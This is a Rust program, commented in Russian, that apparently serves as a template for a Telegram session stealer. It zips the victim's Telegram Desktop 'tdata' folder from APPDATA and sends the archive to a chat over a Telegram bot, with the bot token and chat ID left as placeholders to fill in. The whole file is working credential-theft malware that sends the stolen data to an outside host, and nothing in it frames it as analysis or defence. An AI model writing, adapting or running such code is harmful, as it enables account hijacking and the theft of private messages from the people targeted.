use std::env;
use std::fs::File;
use std::io::{self, copy};
use std::path::{Path, PathBuf};
use teloxide::prelude::*;
use teloxide::types::InputFile;
use zip::{ZipWriter, write::FileOptions};
use walkdir::WalkDir;

fn create_zip<P: AsRef<Path> + Clone>(source_dir: P, output_zip: P) -> zip::result::ZipResult<()> {
    let file = File::create(output_zip)?;
    let mut zip = ZipWriter::new(file);

    let options: FileOptions<()> = FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .unix_permissions(0o755)
        .large_file(true);

    for entry in WalkDir::new(source_dir.clone()) { // Клонируем здесь
        let entry = entry.map_err(|e| zip::result::ZipError::Io(e.into()))?;
        let path = entry.path();

        if path.is_file() {
            let name = path.strip_prefix(source_dir.as_ref()).unwrap();
            zip.start_file(name.to_string_lossy(), options.clone())?; // Используем clone для каждого файла
            let mut f = File::open(path)?;
            copy(&mut f, &mut zip)?;
        }
    }

    zip.finish()?;
    Ok(())
}

#[tokio::main]
async fn main() {
    let token = "{TOKEN}"; // Токен бота
    let chat_id: ChatId = ChatId({CHAT_ID}); // ID чата

    let bot = Bot::new(token);

    let source_dir = PathBuf::from(env::var("APPDATA").unwrap()).join("Telegram Desktop/tdata");
    let zip_path = PathBuf::from("tdata.zip");

    // Создание ZIP-архива
    if let Err(err) = create_zip(&source_dir, &zip_path) {
        eprintln!("Fail to make ZIP: {:?}", err);
        return;
    }

    // Отправка ZIP-файла
    if let Err(err) = bot.send_document(chat_id, InputFile::file(zip_path)).await {
        eprintln!("Fail to send data to telegram: {:?}", err);
    }
}
